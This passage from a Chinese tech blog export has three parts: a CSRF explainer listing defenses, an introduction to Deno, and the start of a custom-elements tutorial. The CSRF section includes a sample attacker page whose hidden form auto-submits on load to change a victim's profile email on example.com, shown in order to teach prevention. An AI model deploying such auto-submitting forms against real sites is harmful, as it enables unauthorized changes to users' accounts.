攻击并不会窃取私人信息，而是触发与受害者帐户相关的某种形式上的变更，例如修改凭据甚至进行购物行为。强迫受害者从服务器获取数据不会对攻击者产生受益，因为攻击方没有接收到服务端的响应。但受害人可以，正因如此，CSRF攻击的目标主要锁定在执行更改的请求上。 Web应用程序中的会话管理通常是基于cookie。每次向服务器发送请求时，浏览器都为请求携带上相关 Cookie，用于标识当前用户的会话。即使请求源来自其他 Web 应用和域，通常也会发生这种情况。这正是攻击者利用的漏洞。 尽管我们通常将 CSRF 描述为基于 cookie 会话相关处理，它也出现在应用程序自动向请求添加一些用户凭据等其他情况下，例如 HTTP 基本认证和基于证书的认证。 例子让我们看下面的示例，为社交网络应用上的一个简单的“个人资料页面”： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt;$.get('htps://example.com/api/profile', function(data) { $('#username').val(data.name); $('#useremail').val(data.email);});&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;form method='post' action='htps://example.com/api/profile'&gt; &lt;fieldset&gt; &lt;legend&gt;Your Profile:&lt;/legend&gt; &lt;label for='username'&gt; Name:&lt;/label&gt; &lt;input name='username' id='username' type='text'&gt; &lt;br&gt;&lt;br&gt; &lt;label for='email' &gt; Email:&lt;/label&gt; &lt;input name='email' id='useremail' type='email'&gt; &lt;br&gt;&lt;br&gt; &lt;button type='submit'&gt; Update &lt;/button&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;该页面只是简单从服务器加载用户配置文件数据，并填充到表单中。如果表单数据被编辑，则发送请求到服务器更新数据。只有当前用户通过身份验证时，服务器才会接受提交的数据。让我们看一下执行 CSRF 攻击的恶意页面。页面由攻击者创建，并且位于其他域上。该页面的目标是根据通过身份验证的受害者向社交网络应用发送请求：```html&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;form method='post' action='htps://example.com/api/profile'&gt; &lt;input type='hidden' name='username' value=\"The Attacker\"&gt; &lt;input type='hidden' name='email' value=\"the@attacker.com\"&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 该页面有一个带有隐藏字段的表单。其操作指向与社交网络的个人资料页面相同的端点。 一旦受害者打开了恶意网站，该表单就会通过页面脚本自动将数据提交至服务器。 当社交应用的用户未通过身份验证时表单没有危害。但如果用户通过了身份验证，则修改将被应用认为是合法请求。 由于浏览器上的 Cookie 跟踪了用户在社交网络上的会话。当易受攻击的 Web 程序收到更新请求时，由于它具有正确的会话 cookie，因此是合法的。 因此，即使攻击者无法直接访问到 Web 应用程序，也可以利用受害者和 CSRF 漏洞来执行未经授权的操作。实际上，与 XSS 攻击不同，攻击者在这里不会直接读取 cookie 并窃取。 此示例是一种过于简单和成熟的攻击，它可能更加复杂，受害者更不易察觉。例如，CSRF 攻击可以嵌入 iframe，且受害者根本不会意识到攻击的发生。 为了降低受到 CSRF 攻击的风险，下面是应遵守的一系列方法。 基于令牌的措施这种防御措施是缓解CSRF攻击的最受欢迎和推荐的方法之一。可以通过两种方法来实现： 有状态—同步器令牌模式 无状态-基于加密或散列的令牌模式 许多流行框架提供了现成的实现技术。 CSRF 内置实现强烈建议开发者在尝试构建自定义系统前，先研究所使用的框架是否内置 CSRF 保护的选项。 即使有这样的系统，仍有一些配置需要开发者正确处理，例如密钥管理和令牌管理。 如果使用的框架中没有内置的 CSRF 保护机制，才考虑自己实现。 让我们看一下 Express 中的内置 CSRF 实现。Express 提供了一个名为 csurf 的中间件，仅此而已。 在本文中，我们不会讨论有关 Express 的知识或安装软件包的详细步骤。 这是我们的 index.js 文件： 1234567891011121314151617181920const express = require('express');const bodyParser = require('body-parser');const csrf = require('csurf')const cookieParser = require('cookie-parser')const app = express();const csrfProtection = csrf({ cookie: true });app.use(cookieParser());app.use(bodyParser.urlencoded({ extended: true }));app.set('view engine', 'ejs');app.get('/', csrfProtection, (req, res) =&gt; { res.render('index', { csrfToken: req.csrfToken() });});app.post('/profile', csrfProtection, (req, res, next) =&gt; { res.send(req.body.name);});app.listen(3000); 然后在 views 目录下添加 index.ejs，如下所示： 123456&lt;form action='/profile' method='POST'&gt; &lt;input type='hidden' name='_csrf' value='&lt;%= csrfToken %&gt;'&gt; &lt;label for='name'&gt; Name:&lt;/label&gt; &lt;input type='text' name='name'&gt; &lt;button type='submit'&gt; Update &lt;/button&gt;&lt;/form&gt; 根路由将使用模板中的csrfToken变量来渲染index.ejs模板。在index.ejs中，csrfToken将被设置为隐藏字段的值。 提交表单后，请求将发送至受 CSRF 保护的/profile路由。如果没有令牌，将抛出无效的CSRF令牌错误。 同步器令牌模式同步器令牌模式允许服务器验证请求并确保它们来自合法的源。该模式的工作原理是在服务器上为每个用户会话或每个请求生成令牌。 客户端发送请求时，服务器必须对比用户会话中的令牌并验证请求中令牌的存在和有效性。 大多数 Web 应用中，服务器使用 HTTP 会话对象来标识已登录用户。这种情况下服务器先生成会话，并将会话 ID 传递给客户端。该会话 ID 大部分时间都保存在客户端 Cookie 中。 每个请求生成令牌的方法更安全，因为攻击者有较少的时间来干扰和利用令牌。这种方法会降低用户体验。如果用户单击浏览器中的“后退”按钮，则上一页可能包含失效令牌。这意味着与上一页的交互将导致服务器无法验证令牌导致请求失败。 CSRF 令牌应具有以下特征： 每个会话具有唯一性 难以预测-安全生成的随机值 CSRF 令牌可以缓解 CSRF 攻击，如果没有令牌，攻击者将无法创建能在服务器上执行的有效请求。由于攻击者可能会拦截或访问 CSRF 令牌，因此请勿使用 Cookie 进行传输。 另外，也不建议通过 GET请求传输 CSRF 令牌，因为如果受保护的站点链接到外部站点，则可能会在多个位置泄漏，例如浏览器历史记录，日志文件，Referrer headers 等。 CSRF令牌应通过以下方式传输： 表单中使用的隐藏字段 AJAX 请求头 将 CSRF 令牌添加到表单的方法如下： 123&lt;form action='/api/payment' method='post'&gt; &lt;input type='hidden' name='CSRFToken' value='WfF1szMUHhiokx9AHFply5L2xAOfjRkE'&gt;&lt;/form&gt; 与上面 Express示例类似，在服务器上生成作为输入字段值的令牌。 基于加密或散列的令牌模式顾名思义，基于加密的令牌模式基于加密。对于现代 Web 应用，这是一种更合适的方法，程序在服务器上不维护任何状态。 令牌由服务器生成的，一般是由用户的会话 ID 和时间戳组成。这使用密钥对其加密。令牌生成后，将其返回给客户端。与同步令牌一样，基于加密的令牌既可以存储在隐藏字段中，也可以添加到 AJAX 请求头。 使用令牌发出请求后，服务器将尝试使用密钥对其进行解密。如果服务器无法解密令牌，则意味着存在某种形式的入侵，并且该请求被视为恶意或无效。 如果服务器成功解码，则将提取会话 ID 和时间戳。首先比较会话 ID 与当前经过身份验证的用户，并将时间戳与当前服务器时间进行比较，以确认其未超出预设到期时间。 如果会话 ID 与当前用户匹配，并且时间戳未过期，则该请求被视为安全请求。 SameSite CookieCookie 的 SameSite 属性用来限制第三方 Cookie，从而减少安全风险。 此属性使浏览器可以决定是否与跨站点请求一起发送cookie。可选值为： Strict- Cookies 仅在第一方上下文中发送，不会与第三方网站发起的请求一起发送。这意味着，如果某个网站上有指向 GitHub 私仓的链接，则单击链接后 GitHub不会收到会话 cookie，用户将无法访问该存储库。 Lax- Cookies 不会通过CSRF倾向的请求方法（例如POST）发送。当用户导航到原始站点时，将发送 Cookie。如果在最近的浏览器版本中未明确指定 SameSite，则这是默认的 cookie 值。如果某个网站上有指向私有GitHub存储库的链接，则 GitHub将收到会话 cookie，且用户将能够访问该存储库。 None-Cookies将在所有情况下（例如第一方请求和跨域请求）发送。此外，将需要 secure flag(SSL/HTTPS)。 所有台式机浏览器和绝大部分移动端浏览器都支持 SameSite 属性。 此属性不是用来完全替代 CSRF 令牌。相反，应该与令牌共存，以便以更可靠的方式保护用户。 Origins 校验此措施包括两个步骤，这些步骤依赖于检查 HTTP 请求头的值： 确定来源域 - 可以通过 Origin 或者 Referer头判断请求来自哪里。 确定目标域 - 请求发送至哪里。 服务器必须验证来源域和目标域是否匹配。如果存在匹配项，则该请求被视为合法并被接受。如果不匹配，由于跨域该请求将被丢弃。 可以默认这些头信息是可靠的，因为它们属于禁止头信息（只能由浏览器修改），无法通过 JavaScript 对其进行修改。 双重 Cookie 验证双重 Cookie 验证是 CSRF 令牌的替代方法。这是一种无状态的方法。 当用户访问应用时，应生成加密强度高的伪随机值，并将其设置为用户计算机上的Cookie，与会话 ID 分开。 然后，服务器要求每个请求都包含该值（通过隐藏的表单或请求参数）。如果它们在服务器端都匹配，则服务器将其接受为合法请求，否则，服务器将拒绝该请求。 补充：作用较弱。任何可以设置 cookie 的攻击者都可以破解此方式（通过漏洞注入 cookie 或者中间人攻击 MitM）。 自定义请求头这种方法非常适合于大量使用 AJAX 请求并依赖 API 訪問的 Web 应用程序。 此方法使用同源策略，该策略限制了仅 JavaScript 可以添加自定义头信息，并且只能在同源内使用。默认情况下，浏览器不允许 JavaScript 使用自定义请求头进行跨域请求。 此解决方案的效率性要求具有鲁棒性的 CORS 配置，因为来自其他域的自定义请求头会触发 CORS 预检查(用于获知服务端是否允许该跨源请求)。 这允许开发者向请求中添加自定义头信息，只需在服务器验证其存在和值即可。 该技术适用于 AJAX 请求，但&lt;form&gt;元素应另外由令牌保护。 基于交互的防御用户行为是一种防止未授权操作非常有效的机制（例如 CSRF 攻击）。有两种常见的方法： 重验证-强制用户在执行请求之前进行验证 CAPTCHA-验证码 尽管此类方法对 CSRF 攻击非常有效，但它们会对用户体验产生影响。它们应主要应用于汇款等关键业务。 预认证防御即使在用户仍未通过身份验证的页面（例如登录页）上，也可能发生 CSRF 攻击。但攻击对预认证页面的影响是完全不同的。 假设现在有一个电子商务网站，受害者正以未验证状态在浏览商品。攻击者可以在该网站上使用 CSRF 攻击，以攻击者的帐户对受害者进行身份验证。当受害者输入信用卡信息时，攻击者将能够使用受害者的信用卡卡购买商品。 为了减少此类攻击，开发者可以在用户尚未通过身份验证时创建会话。遵循上面基于令牌的预防部分中提到的技术，登录表单必须包含 CSRF 令牌。 一旦用户通过身份验证，预会话应转换为真实会话。 参考资源 https://auth0.com/blog/cross-site-request-forgery-csrf/ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#defense-in-depth-techniques","link":"/posts/2a7ab037.html"},{"title":"Deno 简介","text":"How JavaScript works: introduction to Deno 原文请查阅这里，略有删减。 Deno 是用于运行 JavaScript 和 Typescript 应用程序的安全运行时。本文中将研究 Deno 的起源，与 Node.js 在探索模块、包、异步支持、Typescript 支持、安全性和工具等各个方面进行比较。最后将深入了解 Deno 及其实现方式。首先，让我们对 Deno 进行点实操。 快速的 Deno Demo在 mac 上安装 Deno 只需要 brew install deno，其他操作系统可以参考官方安装文档。 Deno 可以运行脚本，也可以是一个“读取-求值-输出”循环（英語：Read-Eval-Print Loop，简称 REPL）。 假如有个 yeah.ts 文件，其内容为： console.log('Yeah, it works!!!') Deno 使用命令 deno run -q ./yeah.ts 执行上面的脚本，得到输出 Yeah, it works!!!。 同样我们来试一下 REPL： 123456$ denoDeno 1.9.0exit using ctrl+d or close()&gt; console.log(‘Yeah, it works!’)Yeah, it works!undefined 除了 run 之外，Deno 还有很多其他的子命令，可以输入 deno -h 查看它们。 我们尝试了一些代码并输入了一些命令，现在来谈谈 Deno 的起源。 Deno 起源在 JSConf EU 2018，Ryan Dahl（Node.js 创造者）在其演讲 “我对 Node.js 感到遗憾的 10 件事” 中宣布了 Deno。这非常酷，创造者可以看到他的先前的项目受欢迎程度飙升，观察它被使用并从错误中吸取教训。典型的场景是创作者尝试改进和重构他们的原始项目。然而，Ryan Dahl 想要实现一些根本性的更改，而在 Node.js 中无法实现这些更改，因为它会破坏兼容性。 彻底改写显然是一个巨大的风险，但 Deno 跨越了鸿沟，势头强劲。 要知道 Deno 还很年轻；第一次提交是在 2018 年 5 月 13 日，而 1.0 版则是在两年后的 2020 年 5 月 13 日发布。 接下来让我们对比以下 Deno 与 Node.js 。 Deno vs Node.js以下是 Node.js 和 Deno 之间的主要区别。稍后我们也会讨论内部结构，但在这里先重点关注功能和开发者体验的差异。 内置包管理 vs npmNode.js 依赖 npm 进行包管理。而 Deno 遵循 Go 和 Rust 的示例，可以通过 URL 从任何地方导入包。 ES 模块 vs CommonJS 模块Node 使用 CommonJS 标准: const module = require(‘module-name’) 而 Deno 使用标准 ES 模块: import module from ‘https://some-repo/module-name.ts' 请注意，Deno 模块导入需要包括文件扩展名的完整模块名。 基于权限的访问与完全开放访问Node 允许你完全访问环境、文件系统和网络。这是一个严重的安全漏洞。曾经有几次攻击就是恶意 npm 模块利用了这点并获得对这些资源的访问权限。 Deno 需要明确的权限，因此在一定程度上它限制了对图谋不轨者所能造成的破坏。 内置 typescript 编译器 vs 需要外部的 typescript 支持Node 不直接支持 Typescript，开发者需要使用一个重型且持续变化的工具链，包括打包器、转译器等。 Deno 直接支持 Typescript，简化了开发者不少的工作。 Promises vs callbacksNode 使用非阻塞 I/O 并且需要回调以在 I/O 操作完成时得到通知。 相反，Deno 使用现代 async/await 范式，它隐藏了回调链的复杂性，并使代码更清晰、更易于梳理。 当然现在 node 也可以轻松支持 async/await 语法。 死于错误 vs 未捕获的异常在 Node 中，可以为所有未捕获的异常设置一个全局处理程序： 123process.on('uncaughtException', function (err) { console.log('忽略...');}) 在 Deno 中，如果不进行异常捕获，程序就会被杀掉。这是一个大胆的设计决策。 接下来我们仔细看看 Deno 的主要特性。 Deno 的主要特性模块和包管理使用 Deno 可以通过 URL 导入模块。这意味着不再需要 package.json 和庞大的 node_modules。也就是说会有一个缓存，开发者只需下载一次包和模块。下面来一个例子： 123import { assertEquals } from \"https://deno.land/std@0.93.0/testing/asserts.ts\";assertEquals(2 + 2, 5);console.log('success!') 如果你的数学不是体育老师教的，会注意到断言是错误的（2 + 2 实际上是 4）。让我们看看 Deno 是否也这么认为： 12345678910111213deno run -q ./import.tserror: Uncaught AssertionError: Values are not equal: [Diff] Actual / Expected- 4+ 5 throw new AssertionError(message); ^ at assertEquals (https://deno.land/std@0.93.0/testing/asserts.ts:219:9) at file:///Users/chkaos/Code/demo/deno-demo/import.ts:2:1 修改一下，看看成功后的输出： 1234import { assertEquals } from \"https://deno.land/std@0.93.0/testing/asserts.ts\";assertEquals(2 + 2, 4);console.log('success!')// success 回到包和导入。让我们看看这一行： import { assertEquals } from “https://deno.land/std@0.93.0/testing/asserts.ts&quot;; 这里 Deno 直接从 URL 导入 assertEquals symbol（Deno 标准库中的一个函数）。请注意，该 URL 包含了版本信息 (std@0.93.0)，因此很容易支持同一包的多个版本。 Deno 在 https://deno.land 中维护了一系列精选包，但开发者可以从任何 URL 导入包。 为了证明这一点，我们将 import 语句替换为以下等效的 import 语句，该语句使用托管 Deno 标准库的 Github URL 进行导入： import { assertEquals } from “https://raw.githubusercontent.com/denoland/deno_std/main/testing/asserts.ts”; 但直接引用任意 URL 也不推荐，笔者自己尝试了但因为各种网络原因也没成功。 异步支持Deno 从其异步 API 返回 \bPromise。这意味着开发者可以运行异步操作并等待结果，而无需编写出回调地狱。 这是一个疯狂的例子： 1234567const promise = Deno.run({cmd: ['deno', 'eval', 'console.log(2+3)']})await promise.status()/*Output:5*/ 这里发生了什么？首先使用 Deno.run() API 来启动一个子进程。启动的子进程是 Deno 的另一个实例求表达式 console.log(2+3) 的值，最后向控制台打印 5。 这种情况下子进程几乎立即返回，但对于长时间运行的进程，我们希望等待完成而不阻塞问题的其余部分，这就是 await promise.status() 的原因。 Deno 与 TypescriptDeno 内置了对 Typescript 的支持。这意味着与浏览器中运行的 Node 或 Web 应用程序不同，不需要重量级和非标准的工具链。 Deno 包含一个 Typescript 编译器会将 Typescript 代码转换为 JavaScript 并稍后在 V8 运行时执行。 Deno 缓存转译的 Typescript 模块，所以只要 Typescript 文件没改变就不会被再次转译。 要查看缓存位置，请检查 Emitted modules cache： 1234567deno infoDENO_DIR location: \"/Users/chkaos/Library/Caches/deno\"Remote modules cache: \"/Users/chkaos/Library/Caches/deno/deps\"Emitted modules cache: \"/Users/chkaos/Library/Caches/deno/gen\"Language server registries cache: \"/Users/chkaos/Library/Caches/deno/registries\"Origin storage: \"/Users/chkaos/Library/Caches/deno/location_data\" 安全性创建 Deno 的初衷之一是安全性。 用户可以控制每个程序的访问级别。 默认情况下，网络、环境和文件系统等资源是不可访问的。例如运行一个尝试写入文件的程序，看看会得到什么结果。 将以下代码段保存到名为 write_file.ts 的文件中。 Deno.writeTextFileSync('data.txt', 'some data') 123456789101112deno run write_file.tserror: Uncaught PermissionDenied: Requires write access to \"data.txt\", run again with the --allow-write flagDeno.writeTextFileSync('data.txt', 'some data') ^ at deno:core/01_core.js:106:46 at unwrapOpResult (deno:core/01_core.js:126:13) at Object.opSync (deno:core/01_core.js:140:12) at openSync (deno:runtime/js/40_files.js:37:22) at writeFileSync (deno:runtime/js/40_write_file.js:27:18) at Object.writeTextFileSync (deno:runtime/js/40_write_file.js:85:12) at file:///Users/chkaos/Code/demo/deno-demo/write_file.ts:1:6 正如预期那样收到了一个权限错误，一条提示告诉开发者需要添加什么标识符。让我们使用适当的权限标识符再次运行程序： 1234$ deno run — allow-write write_file.tsCheck file:///Users/gigi.sayfan/git/deno_test/write_file.ts$ cat data.txtsome data 请注意 Deno REPL 拥有所有权限。因此如果在交互式 Deno 会话中运行不受信任的代码，请务必小心。 工具Deno 非常重视开发者体验。它提供了许多开箱即用的工具。让我们快速回顾一下 Deno 提供的各种工具。 格式化格式化并非必须，但有更好。但是，随着时间的推移，开发者社区里大少精力都浪费到空白和参数括号放置位置等无休止等争论上。 Deno 从 Go 和 Rust 吸取经验并提供了一个 deno fmt 命令。让我们看看官方 deno 格式是什么样的。 考虑以下文件 fmt-test.ts： 12345678function foo(){ console.log('foo here') const x = 3 console.log('x + 2 =', x+2)}foo() 这是一个有效的 Typescript 程序。但是它的格式不是很好。 通过 deno fmt 运行它： 1$ cat fmt_test.ts | deno fmt - 结果如下： 1234567function foo() { console.log(\"foo here\"); const x = 3; console.log(\"x + 2 =\", x + 2);}foo(); Deno fmt 将函数的左大括号与函数声明放在同一行，用两个空格缩进所有内容，将单引号转换为双引号，在 “+” 运算符周围放置空格，并在每行末尾添加分号。 测试测试是编程的重要组成部分。 Deno 不仅依赖社区来提供测试框架，而且还配备了自己的断言模块，开发者可以使用它来编写测试。 在 test-test.ts 文件中定义了一个名为 is_palindrome() 的函数用于检查字符串是否为回文（忽略空格），然后进行一些测试，前两个测试应该通过，第三个应该失败： 12345678910111213141516171819import { assert } from \"https://deno.land/std@0.95.0/testing/asserts.ts\";function is_palindrome(s: string) { const ss = s.replaceAll(' ', '') const a = ss.split('') return a.reverse().join('') == ss} await Deno.test(\"Palindrome 1 - success\", () =&gt; { assert(is_palindrome(\"tattarrattat\"));})await Deno.test(\"Palindrome 2 - success\", () =&gt; { assert(is_palindrome(\"never odd or even\"));})await Deno.test(\"Palindrome 3 - fail\", () =&gt; { assert(is_palindrome(\"this is not a palindrom\"), \"fail!\")}) 使用命令 deno test 会得到以下结果： 123456789101112131415161718192021$ deno test test_test.tsCheck file:///Users/gigi.sayfan/git/deno_test/$deno$test.tsrunning 3 teststest Palindrome 1 — success … ok (1ms)test Palindrome 2 — success … ok (1ms)test Palindrome 3 — fail … FAILED (2ms)failures:Palindrome 3 — failAssertionError: fail!at assert (https://deno.land/std@0.95.0/testing/asserts.ts:178:11)at file:///Users/gigi.sayfan/git/deno_test/test_test.ts:19:3at asyncOpSanitizer (deno:runtime/js/40_testing.js:37:15)at resourceSanitizer (deno:runtime/js/40_testing.js:73:13)at Object.exitSanitizer [as fn] (deno:runtime/js/40_testing.js:100:15)at TestRunner.[Symbol.asyncIterator] (deno:runtime/js/40_testing.js:272:24)at AsyncGenerator.next (&lt;anonymous&gt;)at Object.runTests (deno:runtime/js/40_testing.js:347:22)at async file:///Users/gigi.sayfan/git/deno_test/$deno$test.ts:3:1failures:Palindrome 3 — failtest result: FAILED. 2 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out (4ms) 打包Bundling 使开发者可以将程序的所有模块和依赖项打包到一个单一的，可立即执行的包中。 Deno 提供了 bundle 命令。让我们来实践以下。 foob​​ar.ts 模块从 foo.ts 导入 foo() 函数，从 bar.ts 导入 bar() 函数。 这是 foo.ts 。 123export function foo() { console.log('foo')} 这是 bar.ts ，https://gist.github.com/the-gigi/2d48187fcc1e11ad6c27299487b1a9e0 这是 foobar.ts ： 12345import { foo } from \"./foo.ts\"import { bar } from \"./bar.ts\"foo()bar() 123$ deno bundle foobar.tsBundle file:///Users/gigi.sayfan/git/deno_test/foobar.tsCheck file:///Users/gigi.sayfan/git/deno_test/foobar.ts 最后打包称一个文件，结果如下： 12345678function foo() { console.log('foo');}function bar() { console.log('bar');}foo();bar(); 如上面所见文件里不再需要导入语句，因为 foo() 和 bar() 都包含在单个包文件中，可以直接调用。 调试Deno 允许您通过 V8 检查器协议调试程序。您可以使用 Chrome DevTools 并使用 –inspect 或 –inspect-brk 标识符运行您的程序。我个人更喜欢 JetBrains IDE 和 Deno 插件，这种方式提供了成熟的断点、监视和堆栈跟踪来调试 Deno 代码。 如果选择了 VS Code，那么推荐对应的一个 Deno 插件。同时可以使用以下 launch.json 配置文件手动附加调试器： 脚本安装大部分情况下，使用命令 deno run 运行 deno 程序是没问题的，但是如果需要传递大量权限标识符并且希望能够从任何位置运行程序，那么有更好的选择。 Deno 提供了 deno install 命令，该命令创建一个小 shell 脚本来调用您的 Deno 程序并将其放置在指定的位置或 $HOME/.deno/bin。 让我们来安装 foobar 程序： 12345$ deno install foobar.ts✅ Successfully installed foobar/Users/gigi.sayfan/.deno/bin/foobarℹ️ Add /Users/gigi.sayfan/.deno/bin to PATHexport PATH=”/Users/gigi.sayfan/.deno/bin:$PATH” 将 $HOME/.deno/bin 添加到我的 PATH 中，现在可以通过键入 foobar 从任何地方运行 foobar： 1234$ cd /tmp$ foobarfoobar Deno 内部结构我们审查了 Deno 的特性和用户体验。让我们来看看引擎盖下。 Deno 是使用 Rust 和 TypeScript 实现的。以下是 Deno 的主要组件： deno ：开发者与之交互的 deno 可执行文件。 deno_core：负责 Javascript 执行运行时。 Deno 核心依赖 Tokio 包来实现其异步事件循环。 tsc：标准的 TypeScript 编译器。曾经是 Deno 的 TypeScript 编译器。现在，它主要负责类型检查。 swc：代表 Speedy Web Compiler，在为 Javascript 和 Typescript 代码编译为可以在任何浏览器上执行的 Javascript 方面承担着越来越多的工作。 rusty_v8 总结Deno 是一个充满活力的年轻项目，建立于 Node.js 的经验和教训之上。与 Node.js 相比有很多技术改进。它是使用现代技术堆栈实现的。最大的问题是它是否会成为主流 Javascript 和 Typescript 后端运行时。 现在说还为时过早，但后续关注应该会很有趣。如果开发者有一些计划使用 Node.js 实现的服务器端项目，可以考虑尝试使用 Deno。 在 Node.js、Deno 或其他一些技术之间进行选择应该主要取决于您的项目需求和您团队的专业知识。 如果已经使用 Node.js 构建了一些运行良好的东西，那么单纯为了将它用 Deno 重写而没有其他任何好处可能不是最佳决策。","link":"/posts/92b02c59.html"},{"title":"自定义元素探秘及构建可复用组件最佳实践","text":"How JavaScript works: Under the hood of custom elements + Best practices on building reusable components 原文请查阅这里，略有删减。 概述 在 探究 Shadow DOM及独立组件构建中，我们介绍了 Shadow DOM 接口及相关概念，这都是网页组件的组成部分。网页组件背后的思想即通过创建颗粒化，模块化和可复用的元素来扩展 HTML 内置功能。这是一个相对新的 W3C 标准，已被所有主流浏览器兼容且可以用于生产环境，部分浏览器需要使用 polyfill 库来兼容(将在下面进行讨论)。 正如开发者所知，浏览器为构建网站和网页程序提供了一些重要的开发工具。HTML/CSS/JavaScript 三架马车 即开发者使用 HTML 来构建结构，CSS 进行样式化然后使用 JavaScript 来进行交互。然而，在网页组件出现之前，把 JavaScript 脚本和 HTML 结构组合起来并非易事。 本文将阐述网页组件的基石-自定义元素。总之，开发者可以使用自定义元素接口来创建包含 JavaScript 逻辑和样式的自定义元素(正如字面意思)。许多开发者会把自定义元素和 shadow DOM 混为一谈。但它们是完全不同的概念，二者的关系属于互补而不是竞争关系。 一些框架(比如 Angular，React) 通过引进自有概念来解决同样的问题。开发者可以把自定义元素 和 Angular 的指令/React 组件进行对比。然而，自定义元素是浏览器原生的且只需要原生 JavaScript，HTML 和 CSS。当然了，这并不意味着它可以完全取代 JavaScript 框架。现代框架不仅仅为开发者提供模仿自定义元素行为的能力。因此，可以同时使用框架和自定义元素。 API在深入之前，让我们先快速过一遍接口的内容。全局 customElements 对象为开发者提供了一些方法： define(tagName, constructor, options) －创建一个新的自定义元素。 包含三个参数：自定义元素的有效标签名，类定义及可选参数对象。目前仅支持一个可选参数：extends 指定想要扩展的 HTML 内置元素名称的字符串。用来创建定制化内置元素。 get(tagName) －如果自定义元素已定义则返回自定义元素的构造函数否则返回 undefined。只有一个参数：自定义元素的可用标签名称。 whenDefined(tagName)－返回一个 promise 对象，当定义自定义元素即解析。若元素已定义则立即进行解析。若自定义元素标签名称不可用则 reject promise。只有一个参数：自定义元素的可用标签名称。 如何创建自定义元素创建自定义元素开发者只需要做两件事：创建扩展 HTMLElement 类元素的类定义，然后以合适的名称定义元素。 12345678910class MyCustomElement extends HTMLElement { constructor() { super(); // … } // …}customElements.define('my-custom-element', MyCustomElement); 或使用匿名类以防当前作用域混乱 12345678customElements.define('my-custom-element', class extends HTMLElement { constructor() { super(); // … } // …}); 以上例子可见，使用 customElements.define(...) 方法注册自定义元素。 自定义元素所解决的问题实际问题是什么？嵌套 DIV 是其中一个原因。嵌套 Div 是啥？在现代网页程序中这是一个非常常见的现象，开发者使用多个嵌套块状元素(div 互相嵌套之类)。 12345678910111213&lt;div class=\"top-container\"&gt; &lt;div class=\"middle-container\"&gt; &lt;div class=\"inside-container\"&gt; &lt;div class=\"inside-inside-container\"&gt; &lt;div class=\"are-we-really-doing-this\"&gt; &lt;div class=\"mariana-trench\"&gt; … &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 因为浏览器可以在页面上正常进行渲染，所以使用了这样的嵌套结构。但这会使 HTML 可读性降低且难以维护。 假如有如下组件的切图： 那么传统 HTML 结构大概如下： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;div class=\"primary-toolbar toolbar\"&gt; &lt;div class=\"toolbar\"&gt; &lt;div class=\"toolbar-button\"&gt; &lt;div class=\"toolbar-button-outer-box\"&gt; &lt;div class=\"toolbar-button-inner-box\"&gt; &lt;div class=\"icon\"&gt; &lt;div class=\"icon-undo\"&gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"toolbar-button\"&gt; &lt;div class=\"toolbar-button-outer-box\"&gt; &lt;div class=\"toolbar-button-inner-box\"&gt; &lt;div class=\"icon\"&gt; &lt;div class=\"icon-redo\"&gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"toolbar-button\"&gt; &lt;div class=\"toolbar-button-outer-box\"&gt; &lt;div class=\"toolbar-button-inner-box\"&gt; &lt;div class=\"icon\"&gt; &lt;div class=\"icon-print\"&gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"toolbar-toggle-button toolbar-button\"&gt; &lt;div class=\"toolbar-button-outer-box\"&gt; &lt;div class=\"toolbar-button-inner-box\"&gt; &lt;div class=\"icon\"&gt; &lt;div class=\"icon-paint-format\"&gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 想象一下如果可以使用如下代码实现： 12345678&lt;primary-toolbar&gt; &lt;toolbar-group&gt; &lt;toolbar-button class=\"icon-undo\"&gt;&lt;/toolbar-button&gt; &lt;toolbar-button class=\"icon-redo\"&gt;&lt;/toolbar-button&gt; &lt;toolbar-button class=\"icon-print\"&gt;&lt;/toolbar-button&gt; &lt;toolbar-toggle-button class=\"icon-paint-format\"&gt;&lt;/toolbar-toggle-button&gt; &lt;/toolbar-group&gt;&lt;/primary-toolbar&gt; 第二个示例更简洁且更具可维护性，可读性且对于浏览器和开发者更加合理。 另一个点是可复用性。作为开发者，写的代码不仅要可运行还得可维护。书可维护代码即能够轻易地复用代码片段而不是重复地复制粘贴。 我将给出一个简单示例你就会更清楚。假设有如下元素： 1234&lt;div class=\"my-custom-element\"&gt; &lt;input type=\"text\" class=\"email\" /&gt; &lt;button class=\"submit\"&gt;&lt;/button&gt;&lt;/div&gt; 若需要在其它地方使用这段代码，开发者需要再次书写相同的 HTML 结构。现在想象一下需要稍微修改一下这些元素。开发者需要找出每个代码需要修改的地方，然后一遍遍地做出同样的修改。 使用以下代码会更好。 1&lt;my-custom-element&gt;&lt;/my-custom-element&gt; 但现代网页程序不仅只有静态 HTML。开发者需要做交互。这就需要 JavaScript。一般来说，开发者需要做的即创建一些元素然后在上面监听事件以响应用户输入。点击，拖拽或者悬浮事件等等。 12345var myDiv = document.querySelector('.my-custom-element');myDiv.addEventListener('click', () =&gt; { myDiv.innerHTML = '&lt;b&gt; I have been clicked &lt;/b&gt;';}); 123&lt;div class=\"my-custom-element\"&gt; I have not been clicked yet.&lt;/div&gt; 使用自定义元素接口可以把所有的逻辑封装进元素自身。以下代码可以实现和上面代码一样的功能： 12345678910111213class MyCustomElement extends 